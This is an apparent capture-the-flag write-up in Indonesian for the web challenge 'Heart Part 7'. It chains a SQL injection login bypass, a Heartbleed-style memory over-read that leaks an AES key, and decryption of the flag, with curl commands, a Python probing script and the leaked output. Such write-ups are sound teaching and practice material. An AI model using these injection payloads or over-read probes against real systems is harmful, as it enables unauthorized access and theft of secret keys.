# Heart Part 7 — DAL CTF 2026
**Category:** Web  
**Flag:** `dalctf{p1mp_p1mp_h00r4y}`

> *"what happens on earth stays on earth"*  
> spoiler: the key didn't stay on earth

---

## Overview

Web app Flask sederhana — Kung Fu Kenny's Dojo. Ada tiga route publik: `/`, `/search`, `/login`. Tantangannya minta kita nemuin flag yang di-enkripsi AES-256-CBC dan di-decrypt-nya.

Exploit chain-nya:
1. SQL injection di login → bypass auth
2. Akses `/admin` dengan JWT session
3. Heartbleed-style memory leak di `/cipher/health` → bocorkan AES key
4. Decrypt flag

---

## Recon

```bash
curl -I https://[instance].instancer.dalctf2026.com
# Server: Werkzeug/3.1.8 Python/3.11.15
```

Flask app. Route penting:
- `/search` — GET param `q`, query database teknik kung fu
- `/login` — POST form username/password
- `/admin` — butuh auth

---

## Step 1: SQL Injection di Login

Login form biasa, tidak ada petunjuk apapun. Coba SQLi klasik:

```bash
curl -si -X POST https://[instance].instancer.dalctf2026.com/login \
  -d "username=admin' OR '1'='1'--&password=x"
```

Response:

```
set-cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Location: /admin
```

Langsung bypass. JWT payload-nya kalau di-decode:

```json
{"username": "admin", "role": "admin"}
```

Server generate JWT tanpa verify — cukup inject SQL biar query return true, server langsung kasih token admin.

---

## Step 2: Eksplorasi /admin

```bash
curl -s https://[instance].instancer.dalctf2026.com/admin \
  -H "Cookie: session=[jwt]"
```

Ada tiga hal menarik di halaman ini:

1. **`/api/flag`** — return encrypted flag
2. **`/cipher/health`** — cipher service health check
3. **`/api/techniques`** — CRUD teknik kung fu (tidak relevan)

Ambil encrypted flag dulu:

```bash
curl -s https://[instance].instancer.dalctf2026.com/api/flag \
  -H "Cookie: session=[jwt]"
```

```json
{
  "algorithm": "AES-256-CBC",
  "ciphertext": "baCIJCXuBcIOJ23q0FS8GDaSN5/71aIqY156ju5Z6oc=",
  "iv": "fcSvIZ1LMw72z34mvr0O5A==",
  "sealed_by": "MAadCipher v1.0",
  "status": "ok"
}
```

Flag sudah ada, tinggal butuh key-nya.

---

## Step 3: Heartbleed-style Memory Leak

Endpoint `/cipher/health` menerima JSON dengan field `data` dan `size`:

```bash
curl -s -X POST https://[instance].instancer.dalctf2026.com/cipher/health \
  -H "Cookie: session=[jwt]" \
  -H "Content-Type: application/json" \
  -d '{"data": "PING", "size": 4}'
```

```json
{
  "algorithm": "AES-256-CBC",
  "echo": "UElORw==",
  "service": "MAadCipher",
  "status": "ok"
}
```

Field `echo` itu base64 dari input kita — `UElORw==` = `PING`. Normal.

Tapi `size` mencurigakan. Coba naikin nilainya:

```python
import requests, base64

COOKIE = "session=[jwt]"
URL = "https://[instance].instancer.dalctf2026.com/cipher/health"

for size in [4, 16, 32, 64, 128, 256, 512]:
    r = requests.post(URL,
        headers={"Cookie": COOKIE, "Content-Type": "application/json"},
        json={"data": "PING", "size": size})
    echo = base64.b64decode(r.json().get("echo", "")).decode("latin-1")
    print(f"size={size:4d} | len={len(echo):4d} | {echo[:80]}")
```

Output:

```
size=   4 | len=   0 | 
size=  16 | len=  16 | PING
size=  32 | len=  32 | PING
size=  64 | len=  64 | PING
size= 128 | len= 128 | PINGKENDRICK_MASTER_KEY=...
size= 256 | len= 256 | PINGKENDRICK_MASTER_KEY=...
size= 512 | len= 512 | PINGKENDRICK_MASTER_KEY=...
```

Server allocate buffer sebesar `size`, copy input ke dalamnya, lalu return seluruh buffer — termasuk data yang ada di memory sebelumnya. Persis Heartbleed (CVE-2014-0160), tapi versi Python/Flask.

Dump hex penuh:

```bash
curl -s -X POST https://[instance].instancer.dalctf2026.com/cipher/health \
  -H "Cookie: session=[jwt]" \
  -H "Content-Type: application/json" \
  -d '{"data": "PING", "size": 512}'
```

Decode base64 response-nya, parse hex:

```
50494e47 00000000 ... 4b454e445249434b5f4d41535445525f4b45593d
9e1b8a5f 8ed44e47 11c0f476 8c13f5a3 36bc4a6d eeea3077 20a87b9f ca44f02d
```

`4b454e445249434b5f4d41535445525f4b45593d` = `KENDRICK_MASTER_KEY=`

32 bytes setelahnya adalah AES-256 key:

```
9e1b8a5f8ed44e4711c0f4768c13f5a336bc4a6deeea307720a87b9fca44f02d
```

---

## Step 4: Decrypt Flag

Semua bahan sudah ada:
- **Key:** `9e1b8a5f8ed44e4711c0f4768c13f5a336bc4a6deeea307720a87b9fca44f02d`
- **IV:** `fcSvIZ1LMw72z34mvr0O5A==` (dari `/api/flag`)
- **Ciphertext:** `baCIJCXuBcIOJ23q0FS8GDaSN5/71aIqY156ju5Z6oc=`

```python
import base64
from Crypto.Cipher import AES

leaked = bytes.fromhex(
    "4b454e445249434b5f4d41535445525f4b45593d"
    "9e1b8a5f8ed44e4711c0f4768c13f5a336bc4a6d"
    "eeea307720a87b9fca44f02d"
)
key = leaked[leaked.index(b"=") + 1 : leaked.index(b"=") + 33]

ct = base64.b64decode("baCIJCXuBcIOJ23q0FS8GDaSN5/71aIqY156ju5Z6oc=")
iv = base64.b64decode("fcSvIZ1LMw72z34mvr0O5A==")

cipher = AES.new(key, AES.MODE_CBC, iv)
print(cipher.decrypt(ct))
# b'dalctf{p1mp_p1mp_h00r4y}\x08\x08\x08\x08\x08\x08\x08\x08'
```

PKCS7 padding `\x08` × 8 — normal. Strip, done.

---

## Flag

```
dalctf{p1mp_p1mp_h00r4y}
```

---
